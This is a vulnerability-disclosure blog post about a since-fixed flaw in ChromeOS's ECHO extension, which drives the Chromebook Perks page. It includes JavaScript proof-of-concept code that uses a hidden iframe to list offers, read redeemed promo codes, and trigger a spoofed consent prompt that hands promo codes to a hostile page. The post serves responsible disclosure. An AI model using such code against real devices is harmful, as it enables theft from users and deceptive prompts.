---
title: Abusing the Chromebook Perks System to Steal Promo Codes
date: 11/18/23
description: The Chromebook Perks page lets you redeem a few promo codes for your Chrome OS device, but how this page actually validates your device is rather interesting. Unfortunately for Google, they didn't make this system very secure.
url: https://ading.dev/blog/posts/echoanywhere.html
---

## Introduction:
If you've ever owned a personal Chromebook, then you've likely seen the [Chromebook Perks](https://www.google.com/chromebook/perks/) page. This site hosts a list of offers for your specific Chrome OS device, and lets you redeem some promo codes for various services. The interesting part about this page is how it actually validates whether or not you're using an eligible device. Unfortunately for Google, they didn't make this system very secure. 

## The Chromebook Perks System:
The Perks page isn't actually responsible for checking the available offers and redeeming them. Instead, this is handled by a hidden Chrome extension called ECHO, which the webpage can send data to. Just like QuickOffice, ECHO is a component extension, meaning that it's included with every Chrome OS installation. Also, it should be noted that all of this code is inside the proprietary portion of Chrome OS, which is probably why this bug was only discovered recently. 

The ECHO extension (sometimes called "Chrome Goodies") has access to a few private Chrome APIs, the most important one being `chrome.echoPrivate`. This API is responsible for the user consent prompt, as well as returning a list of valid offers. The extension also has the ability to retrieve hidden system information, such as the board name and the device ID, which is used for the validation aspect.

The method that the Perks page uses to communicate to the extension is rather shoddy. For whatever reason, instead of using the [`chrome.runtime`](https://developer.chrome.com/docs/extensions/reference/runtime/) API to handle this, Google opted to use an iframe. The page simply puts an extension page inside an iframe (`chrome-extension://kddnkjkcjddckihglkfcickdhbmaodcn/broker.html`) and posts messages to it via `iframe.postMessage`. Apparently this may have once been an intended feature, but who knows what they were thinking back in 2012 when most of this code was written.

After this, the `broker.html` page receives the posted data and passes it on to the extension's background page (this time using `chrome.runtime`). This is where the private APIs mentioned earlier are actually used. The response is passed back to `broker.html`, which finally returns this data to the Perks page by posting a message to its parent. 

## The Vulnerability:
Chrome only lets regular webpages iframe an extension page if that extension has explicitly allowed it. Normally, to reduce the chances of abuse, an extension would restrict access to only a few domains. The manifest of the ECHO extension, however, allows *any* webpage to access `broker.html`, via the [`web_accessible_resources`](https://developer.chrome.com/docs/extensions/mv2/manifest/web_accessible_resources/) property. Additionally, the ECHO extension never checks where the messages originate from, so any webpage is able to impersonate the Perks page and communicate with the extension.

What's puzzling about this bug is that the code for handing `chrome.runtime` messages is already present in the extension, so there's no reason to use the insecure iframe method. Also present in the Chrome Perks system [is code which utilizes](https://web.archive.org/web/20231116025133/https://www.gstatic.com/chromeos/offers/js/echo_provider_api.js) the removed [Web Intents](https://en.wikipedia.org/wiki/Web_Intents) API to communicate with the extension. This API only existed for six Chrome versions (18 to 23) before being removed in 2012. Even after this bug was fixed, the broken Web Intents code *still* exists in the current Chrome Perks page.

So what can an attacker do with this anyways?

## Possible Payloads:
Here's a minimal proof-of-concept which is able to post messages to the extension and get all the offers the current device is eligible for, as well as any previously redeemed promo codes.
```js
let iframe = document.createElement("iframe");
iframe.src = "chrome-extension://kddnkjkcjddckihglkfcickdhbmaodcn/broker.html";
iframe.style.display = "none";
iframe.onload = () => {
  iframe.contentWindow.postMessage({
    cmd: "getOfferInfo"
  }, "chrome-extension://kddnkjkcjddckihglkfcickdhbmaodcn");
};
window.addEventListener("message", console.log);
document.body.append(iframe);
```

A webpage is also able to trigger the user consent prompt for redeeming an offer. If the user hits allow, then the offer gets redeemed, with the malicious page receiving the stolen promo code. 
```js
iframe.contentWindow.postMessage({
  origin: "https://www.google.com/chromebook/perks/",
  serviceId: "minecraft.2023",
  serviceName: "free minecraft fr fr",
  requestNonce: ""+Math.random(),
  isGroupType: false,
  isDebugMode: false,
  otcCode: false
}, "chrome-extension://kddnkjkcjddckihglkfcickdhbmaodcn");
```

Once this code is run, the following popup gets displayed:

![the fake user consent popup](/blog/assets/echoanywhere/echo_popup_small.png)

In this case, the `serviceId` determines which offer gets redeemed, with the `minecraft.2023` offer corresponding to the [free Minecraft](https://chromeunboxed.com/chromebook-perk-minecraft-realms) promotion happening right now. Once the user hits the "allow" button, the offer will be redeemed, and the malicious page can see the returned promo code. 

The service name can also be set to any string, which will influence what is shown in the dialog. If this is set to a long enough string, the "wants to check if you are using an eligible Chrome OS device" part of the dialog disappears. This dialog is also able to block all inputs to the browser window, which can be used for a denial-of-service attack.

## Conclusion:
I reported this vulnerability to Google on May 6th, 2023. It was immediately classified as P1/S1 (high priority, high severity), although it would take until August 10th until it would finally be fixed. Shortly after the bug was marked as fixed, it was tagged as `reward-topanel`, which meant that it was headed to the [VRP panel](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules) to have a reward amount determined. It's been over 90 days since this happened, so I guess they forgot about it or something.

You can take a look at the original [bug report](https://bugs.chromium.org/p/chromium/issues/detail?id=1443214) if you want, and here's a link to my [final POC](https://local.ading.dev/echoanywhere/).

Anyways, it turns out that if you still ship legacy proprietary code from 2012, large security issues will show up as soon as someone actually takes a good look at it. Sure enough, other portions of the ECHO system turned out to vulnerable as well, as [Bypassi](https://blog.bypassi.com/) would discover soon after. But that's a story for another day.